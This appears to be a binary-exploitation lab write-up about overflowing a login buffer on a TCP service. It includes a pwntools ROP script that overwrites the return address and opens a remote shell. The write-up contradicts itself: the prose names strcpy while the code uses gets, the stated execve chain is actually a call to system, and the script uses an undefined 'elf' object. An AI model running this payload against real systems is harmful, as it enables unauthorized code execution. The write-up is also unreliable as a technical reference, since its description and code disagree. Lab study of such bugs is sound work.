---
title: Stack Buffer Overflow on a Vulnerable Login Service
date: 2026-02-11
category: Binary Exploitation
tags: [pwn, x86-64, gdb]
difficulty: Medium
summary: Exploiting an unbounded strcpy in a login prompt to hijack control flow and pop a shell.
---

## Objective

The target binary exposes a login prompt over TCP. The goal is to gain remote code execution by exploiting a memory-safety bug in the input handling.

## Recon

Running `checksec` on the binary shows no stack canary and no PIE:

```
Arch:     amd64-64-little
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

No canary and a fixed base address make this a straightforward return-address overwrite, as long as we can defeat NX (here, via a ROP chain).

## The bug

The `login()` function copies user input into a fixed 64-byte buffer with `strcpy`, with no bounds checking:

```c
void login() {
    char buf[64];
    printf("username: ");
    gets(buf); // <-- no bounds check
}
```

## Exploitation

1. Find the offset to the saved return address with a cyclic pattern.
2. Locate usable ROP gadgets with `ROPgadget`.
3. Build a chain that calls `execve("/bin/sh", NULL, NULL)`.

```python
from pwn import *

offset = 72
pop_rdi = 0x400d13
binsh = 0x601060
system = elf.plt['system']

payload = b'A' * offset
payload += p64(pop_rdi) + p64(binsh)
payload += p64(system)

io = remote('target', 1337)
io.sendline(payload)
io.interactive()
```

## Result

Sending the payload returns a shell as the service user. From here, privilege escalation would be the next step in a full engagement.

## What I learned

Rebuilding this manually made the theory behind ROP chains click in a way that reading about it never did — especially how gadget selection is constrained by what's actually present in the binary's `.text` section.
